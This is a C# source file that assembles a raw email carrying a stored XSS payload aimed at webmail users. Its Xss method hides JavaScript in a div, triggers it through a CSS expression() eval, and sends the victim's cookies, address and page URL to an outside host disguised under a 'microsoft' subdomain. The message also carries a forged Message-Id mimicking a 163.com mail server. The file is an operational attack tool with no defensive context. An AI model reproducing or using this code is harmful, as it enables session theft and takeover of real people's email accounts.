using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace MailExposure.MailXssCode
{
    class IP
    {
        // Fields
        private string CRLF;
        private Model model;

        // Methods
        public IP()
        {
            CRLF = "\r\n";
            model = new Model();
        }
        public string MailPackage(Model model)
        {
            this.Xss(model);
            return ("To:" + model.Addressee + this.CRLF + " FROM:" + model.Nickname + "<" + model.Addresser + ">" + this.CRLF + "Message-Id: <4C204D28.1CBB7D.06708@m12-17.163.com>" + this.CRLF + "Subject:" + model.Subject + this.CRLF + "MIME-Version: 1.0" + this.CRLF + "Content-type:text/html;" + this.CRLF + "Content-Transfer-Encoding:quoted-printable" + this.CRLF + this.CRLF + model.Content + model.XSSCode + "--MAIL--" + this.CRLF + this.CRLF + "." + this.CRLF);
        }
        private void Xss(Model model)
        {
            model.Address = "http://microsoft.us66.ns35.com/yahoo/index.asp?";
            model.XSSCode = "</div><div id=3Dmyp style=3D'display:none'>document.location=3D\"" + model.Address + "uid=" + model.Addressee + "&cookie=3D\"+escape(document.cookie)+'Mail20100624_Url'+document.URL;</div>\r\n<style>\r\ndiv{top:expression;background:url(\"http://mimg.163.com/jy3style/lib/htmlEditor/portrait/face/preview/face1.gif\"none;x:expression(\r\n(window.rrr=3D=3D1)?'':eval('rrr=3D1;eval(myp.innerHTML);')););}\r\n</style>";
        }
    }
}
